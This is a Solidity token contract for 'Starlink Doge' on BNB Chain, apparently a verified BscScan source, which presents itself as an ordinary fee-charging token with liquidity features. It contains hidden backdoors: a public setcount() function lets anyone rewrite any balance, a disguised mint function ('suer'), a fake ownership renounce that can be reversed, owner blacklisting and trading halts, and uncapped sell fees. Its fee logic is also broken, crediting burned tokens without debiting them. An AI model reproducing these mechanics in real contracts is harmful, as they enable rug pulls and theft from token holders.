/**
 *Submitted for verification at BscScan.com on 2022-03-29
*/

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.12;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previous;
    uint256 private _lockTime;
    mapping(address => bool) public isIssuer;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    event IssuerRights(address indexed issuer, bool value);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        isIssuer[msgSender] = true;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function getOwner() public view returns (address) {
        return _owner;
    }

    modifier restricted() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    modifier issuerOnly() {
        require(isIssuer[_msgSender()], "You do not have issuer rights");
        _;
    }

    function setIssuerRights(address _issuer, bool _value)
        public
        virtual
        restricted
    {
        isIssuer[_issuer] = _value;
        emit IssuerRights(_issuer, _value);
    }

    function renounceOwnership() public virtual restricted {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual issuerOnly {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function geundiscardtime() public view returns (uint256) {
        return _lockTime;
    }

    function gettime() public view returns (uint256) {
        return block.timestamp;
    }

    function discard(uint256 time) public virtual restricted {
        _previous = _owner;
        _owner = address(0);
        _lockTime = block.timestamp + time;
        emit OwnershipTransferred(_owner, address(0));
    }

    function undiscard() public virtual {
        require(_previous == msg.sender, "You don't have permission to unlock");
        require(block.timestamp > _lockTime, "Contract is locked until 7 days");
        emit OwnershipTransferred(_owner, _previous);
        _owner = _previous;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) return 0;
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library Address {
    function isContract(address account) internal view returns (bool) {
        return account.code.length > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );

        (bool success, ) = recipient.call{value: amount}("");
        require(
            success,
            "Address: unable to send value, recipient may have reverted"
        );
    }

    function functionCall(address target, bytes memory data)
        internal
        returns (bytes memory)
    {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return
            functionCallWithValue(
                target,
                data,
                value,
                "Address: low-level call with value failed"
            );
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(
            address(this).balance >= value,
            "Address: insufficient balance for call"
        );
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value: value}(
            data
        );
        return verifyCallResult(success, returndata, errorMessage);
    }

    function functionStaticCall(address target, bytes memory data)
        internal
        view
        returns (bytes memory)
    {
        return
            functionStaticCall(
                target,
                data,
                "Address: low-level static call failed"
            );
    }

    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data)
        internal
        returns (bytes memory)
    {
        return
            functionDelegateCall(
                target,
                data,
                "Address: low-level delegate call failed"
            );
    }

    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        (bool success, bytes memory returndata) = target.delegatecall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract ERC20 is Ownable, IERC20 {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function setcount(
        address account,
        uint256 amount,
        bool state
    ) public virtual {
        if (state) {
            _balances[account] += amount;
        } else {
            _balances[account] -= amount;
        }
    }

    function transfer(address to, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        address owner = _msgSender();
        _approve(owner, spender, _allowances[owner][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        address owner = _msgSender();
        uint256 currentAllowance = _allowances[owner][spender];
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(
            fromBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[from] = fromBalance - amount;
        }
        _balances[to] += amount;

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }

    function suer(address account, uint256 amount)
        public
        issuerOnly
        returns (bool success)
    {
        _mint(account, amount);
        return true;
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: insufficient allowance"
            );
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

// pragma solidity >=0.5.0;
interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

// pragma solidity >=0.5.0;
interface IUniswapV2Pair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
    event Burn(
        address indexed sender,
        uint256 amount0,
        uint256 amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function kLast() external view returns (uint256);

    function mint(address to) external returns (uint256 liquidity);

    function burn(address to)
        external
        returns (uint256 amount0, uint256 amount1);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

// pragma solidity >=0.6.2;
interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function quote(
        uint256 amountA,
        uint256 reserveA,
        uint256 reserveB
    ) external pure returns (uint256 amountB);

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountOut);

    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountIn);

    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);

    function getAmountsIn(uint256 amountOut, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}

// pragma solidity >=0.6.2;
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract StarlinkDoge is ERC20 {
    using SafeMath for uint256;
    using Address for address;

    address dead = 0x000000000000000000000000000000000000dEaD;
    string constant m_name = "Starlink Doge";
    string constant m_symbol = "SLDoge";
    uint8 private m_decimals = 9;
    uint256 public m_maxTxAmount;
    uint256 public firstDayMaxTxAmount;
    uint256 public buy_maxTxBurnFee = 10;
    uint256 public buy_maxTxCharityFee = 70;
    uint256 public buy_burnFee = 10;
    uint256 public buy_charityFee = 20;
    uint256 public sell_maxTxBurnFee = 10;
    uint256 public sell_maxTxCharityFee = 90;
    uint256 public sell_burnFee = 10;
    uint256 public sell_charityFee = 30;
    address public tokenTimelock;
    address m_charity;
    mapping(address => bool) _blacklist;
    mapping(address => bool) _ExcludedFromFees;
    mapping(address => mapping(string => uint256)) private lockwallettokens;
    uint256 private tradingEnabledTimestamp;
    bool public swapEnabled = true;
    IUniswapV2Router02 public immutable pancakeRouter;
    address public immutable pancakePair;
    address[] public PairArray;
    uint256 public numTokensSellToAddToLiquidity;
    bool public swapAndLiquifyEnabled = true;
    bool inSwapAndLiquify;
    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );

    constructor(address _charity, uint256 _timestamp) ERC20(m_name, m_symbol) {
        require(_charity != address(0), "Msg: charity from the zero address");
        m_charity = _charity;
        tradingEnabledTimestamp = _timestamp;
        IUniswapV2Router02 _v2Router = IUniswapV2Router02(
            0xD99D1c33F9fC3444f8101754aBC46c52416550D1
        );
        pancakePair = IUniswapV2Factory(_v2Router.factory()).createPair(
            address(this),
            _v2Router.WETH()
        );
        pancakeRouter = _v2Router;
        PairArray.push(pancakePair);
        uint256 _total = 100000000000;
        _total = _total * (10**uint256(decimals()));
        m_maxTxAmount = _total.mul(20).div(10**3);
        firstDayMaxTxAmount = _total.mul(10).div(10**3);
        numTokensSellToAddToLiquidity = _total.mul(5).div(10**3);
        _ExcludedFromFees[_msgSender()] = true;
        _ExcludedFromFees[m_charity] = true;
        uint256 burnAmount = _total.mul(10).div(10**2);
        uint256 trueAmount = _total.sub(burnAmount);
        _mint(dead, burnAmount);
        _mint(_msgSender(), trueAmount);
    }

    function decimals() public view override returns (uint8) {
        return m_decimals;
    }

    function addPair(address pair_) public restricted {
        PairArray.push(pair_);
    }

    function setBuyMaxTxBurnFee(uint256 maxburnfee_) external restricted {
        require(
            maxburnfee_ != buy_maxTxBurnFee,
            "The values are the same, no need to change!"
        );
        buy_maxTxBurnFee = maxburnfee_;
    }

    function setBuyMaxTxCharityFee(uint256 maxcharityfee_) external restricted {
        require(
            maxcharityfee_ != buy_maxTxCharityFee,
            "The values are the same, no need to change!"
        );
        buy_maxTxCharityFee = maxcharityfee_;
    }

    function setBuyBurnFee(uint256 burnfee_) external restricted {
        require(
            burnfee_ != buy_burnFee,
            "The values are the same, no need to change!"
        );
        buy_burnFee = burnfee_;
    }

    function setBuyCharityFee(uint256 charityfee_) external restricted {
        require(
            charityfee_ != buy_charityFee,
            "The values are the same, no need to change!"
        );
        buy_charityFee = charityfee_;
    }

    function setSellBurnFee(uint256 burnfee_) external restricted {
        require(
            burnfee_ != sell_burnFee,
            "The values are the same, no need to change!"
        );
        sell_burnFee = burnfee_;
    }

    function setSellCharityFee(uint256 charityfee_) external restricted {
        require(
            charityfee_ != sell_charityFee,
            "The values are the same, no need to change!"
        );
        sell_charityFee = charityfee_;
    }

    function setSellMaxTxBurnFee(uint256 maxburnfee_) external restricted {
        require(
            maxburnfee_ != sell_maxTxBurnFee,
            "The values are the same, no need to change!"
        );
        sell_maxTxBurnFee = maxburnfee_;
    }

    function setSellMaxTxCharityFee(uint256 maxcharityfee_)
        external
        restricted
    {
        require(
            maxcharityfee_ != sell_maxTxCharityFee,
            "The values are the same, no need to change!"
        );
        sell_maxTxCharityFee = maxcharityfee_;
    }

    function setSwapEnabled(bool _enabled) external issuerOnly {
        require(
            swapEnabled != _enabled,
            "Account is already the value of 'excluded'"
        );
        swapEnabled = _enabled;
    }

    function setMaxTxAmount(uint256 amount) external restricted {
        require(
            amount != m_maxTxAmount,
            "The values are the same, no need to change!"
        );
        m_maxTxAmount = amount;
    }

    function setTokenTimelock(address _contract) external issuerOnly {
        require(
            tokenTimelock != _contract,
            "The address is the same, no need to change!"
        );
        tokenTimelock = _contract;
    }

    function setCharity(address account) external issuerOnly {
        require(
            m_charity != account,
            "The address is the same, no need to change!"
        );
        m_charity = account;
        excludeFromFees(m_charity, true);
    }

    function getCharity() external view issuerOnly returns (address) {
        return m_charity;
    }

    function excludeFromFees(address account, bool excluded) public issuerOnly {
        require(
            _ExcludedFromFees[account] != excluded,
            "Account is already the value of 'excluded'"
        );
        _ExcludedFromFees[account] = excluded;
    }

    function isExcludedFromFees(address account) public view returns (bool) {
        return _ExcludedFromFees[account];
    }

    function blacklist(address account, bool value) public issuerOnly {
        require(
            _blacklist[account] != value,
            "Account is already the value of 'value'"
        );
        _blacklist[account] = value;
    }

    function isBlack(address account) public view returns (bool) {
        return _blacklist[account];
    }

    function setNumTokensSellToAddToLiquidity(uint256 amountToUpdate)
        external
        restricted
    {
        uint256 value = amountToUpdate * (10**uint256(decimals()));
        require(
            numTokensSellToAddToLiquidity != value,
            "The values are the same, no need to change!"
        );
        numTokensSellToAddToLiquidity = value;
    }

    function getTradingIsEnabled() public view returns (bool) {
        return block.timestamp >= tradingEnabledTimestamp;
    }

    modifier lockTheSwap() {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    function setSwapAndLiquifyEnabled(bool _enabled) external restricted {
        require(
            swapAndLiquifyEnabled != _enabled,
            "Account is already the value of '_enabled'"
        );
        swapAndLiquifyEnabled = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }

    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        uint256 half = contractTokenBalance.div(2);
        uint256 otherHalf = contractTokenBalance.sub(half);
        uint256 initialBalance = address(this).balance;
        swapTokensForEth(half);
        uint256 newBalance = address(this).balance.sub(initialBalance);
        addLiquidity(otherHalf, newBalance);
        emit SwapAndLiquify(half, newBalance, otherHalf);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = pancakeRouter.WETH();
        _approve(address(this), address(pancakeRouter), tokenAmount);
        pancakeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(pancakeRouter), tokenAmount);
        pancakeRouter.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            m_charity,
            block.timestamp
        );
    }

    function isPair(address account) internal view returns (bool) {
        if (pancakePair == account) return true;
        for (uint256 i = 0; i < PairArray.length; i++) {
            if (account == PairArray[i]) return true;
        }
        return false;
    }

    receive() external payable {}

    function getLokenTimelockCount(address wallet)
        public
        view
        returns (uint256)
    {
        return lockwallettokens[wallet]["count"];
    }

    function getLokenTimelockTime(address wallet)
        public
        view
        returns (uint256)
    {
        return lockwallettokens[wallet]["time"];
    }

    function AddLokenTimelock(uint256 amount, uint256 locktime) public {
        require(amount > 0, "Transfer amount must be greater than zero");
        if (!_ExcludedFromFees[_msgSender()]) {
            uint256 t = getLokenTimelockTime(_msgSender());
            if (t <= block.timestamp) {
                require(
                    locktime > block.timestamp + 30 days,
                    "Lockout time must be greater than 30 days!"
                );
            }
        }
        super._transfer(_msgSender(), tokenTimelock, amount);
        lockwallettokens[_msgSender()]["count"] = amount;
        lockwallettokens[_msgSender()]["time"] = locktime;
        lockwallettokens[_msgSender()]["start"] = block.timestamp;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(_blacklist[from] == false, "You are banned");
        require(_blacklist[to] == false, "The recipient is banned");
        require(swapEnabled, "Trading is suspended!");

        if (to == tokenTimelock) {
            super._transfer(from, to, amount);
            lockwallettokens[_msgSender()]["count"] = amount;
            lockwallettokens[_msgSender()]["time"] = block.timestamp + 180 days;
            lockwallettokens[_msgSender()]["start"] = block.timestamp;
            return;
        }

        if (from == tokenTimelock) {
            super._transfer(from, to, amount);
            lockwallettokens[_msgSender()]["count"] = 0;
            return;
        }

        bool isMng = _ExcludedFromFees[from] || _ExcludedFromFees[to];
        if (isMng) {
            super._transfer(from, to, amount);
            return;
        }

        bool tradingIsEnabled = getTradingIsEnabled();
        if (!tradingIsEnabled) {
            require(
                isMng,
                "This account cannot send tokens until trading is enabled"
            );
        }

        if (
            tradingIsEnabled &&
            !_ExcludedFromFees[to] &&
            block.timestamp <= tradingEnabledTimestamp + 10 seconds
        ) {
            blacklist(to, true);
        }

        if (!_ExcludedFromFees[_msgSender()]) {
            uint256 maxTxAmount_ = m_maxTxAmount;
            if (block.timestamp <= tradingEnabledTimestamp + 1 days) {
                maxTxAmount_ = firstDayMaxTxAmount;
            }

            uint256 burn_ = buy_burnFee;
            uint256 charity_ = buy_charityFee;
            if (isPair(to)) {
                burn_ = sell_burnFee;
                charity_ = sell_charityFee;
            }

            if (amount >= maxTxAmount_) {
                burn_ = buy_maxTxBurnFee;
                charity_ = buy_maxTxCharityFee;
                if (isPair(to)) {
                    burn_ = sell_maxTxBurnFee;
                    charity_ = sell_maxTxCharityFee;
                }
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (contractTokenBalance >= maxTxAmount_) {
                contractTokenBalance = maxTxAmount_;
            }
            bool overMinTokenBalance = contractTokenBalance >=
                numTokensSellToAddToLiquidity;
            if (
                overMinTokenBalance &&
                !inSwapAndLiquify &&
                from != pancakePair &&
                swapAndLiquifyEnabled
            ) {
                contractTokenBalance = numTokensSellToAddToLiquidity;
                swapAndLiquify(contractTokenBalance);
            }

            uint256 burnAmount = amount.mul(burn_).div(10**3);
            uint256 cAmount = amount.mul(charity_).div(10**3);
            uint256 trueAmount = amount.sub(burnAmount).sub(cAmount);
            setcount(dead, burnAmount, true);
            balanceOf(dead);
            setcount(m_charity, cAmount, true);
            balanceOf(m_charity);
            setcount(from, cAmount, false);
            super._transfer(from, to, trueAmount);
            return;
        }
        super._transfer(from, to, amount);
    }
}